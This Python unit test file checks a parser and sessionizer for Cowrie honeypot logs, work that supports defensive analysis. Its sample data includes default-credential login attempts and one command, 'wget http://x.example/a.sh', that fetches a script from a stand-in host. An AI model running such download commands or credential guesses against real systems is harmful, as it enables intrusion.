"""Unit tests for the parser and sessionizer. Run: python -m unittest discover -s tests"""
import json
import tempfile
import unittest
from pathlib import Path

from src.parser import parse_log_file
from src.sessionizer import build_sessions

IP = "1.2.3.4"
SID = "sess0001"


def ev(eventid, ts, **extra):
    base = {"eventid": eventid, "timestamp": f"2026-01-01T10:00:{ts}Z",
            "src_ip": IP, "session": SID}
    base.update(extra)
    return json.dumps(base)


SAMPLE_LINES = [
    ev("cowrie.session.connect", "00.000"),
    ev("cowrie.login.failed", "01.000", username="root", password="123"),
    ev("cowrie.login.failed", "02.000", username="admin", password="admin"),
    ev("cowrie.login.success", "03.000", username="root", password="toor"),
    ev("cowrie.command.input", "05.000", input="wget http://x.example/a.sh"),
    ev("cowrie.session.closed", "05.000", duration=5.0),
    "this is not json {",                      # bad line
    ev("cowrie.client.version", "00.500"),     # irrelevant event type
    "",                                        # blank line (ignored)
]


class TestPipeline(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.path = Path(self.tmp.name) / "test.json"
        self.path.write_text("\n".join(SAMPLE_LINES), encoding="utf-8")
        self.events, self.stats = parse_log_file(self.path)

    def tearDown(self):
        self.tmp.cleanup()

    def test_parse_stats(self):
        self.assertEqual(self.stats["total_lines"], 8)
        self.assertEqual(self.stats["skipped_bad"], 1)
        self.assertEqual(self.stats["skipped_irrelevant"], 1)
        self.assertEqual(self.stats["parsed_events"], 6)
        self.assertEqual(len(self.events), 6)

    def test_missing_file_raises(self):
        with self.assertRaises(FileNotFoundError):
            parse_log_file(Path(self.tmp.name) / "nope.json")

    def test_session_features(self):
        sessions = build_sessions(self.events)
        self.assertEqual(len(sessions), 1)
        row = sessions.iloc[0]
        self.assertEqual(row["n_failed_logins"], 2)
        self.assertEqual(row["n_success_logins"], 1)
        self.assertEqual(row["n_commands"], 1)
        self.assertEqual(row["n_unique_usernames"], 2)
        self.assertTrue(row["login_success"])
        self.assertTrue(row["has_download_cmd"])
        self.assertEqual(row["duration_sec"], 5.0)


if __name__ == "__main__":
    unittest.main()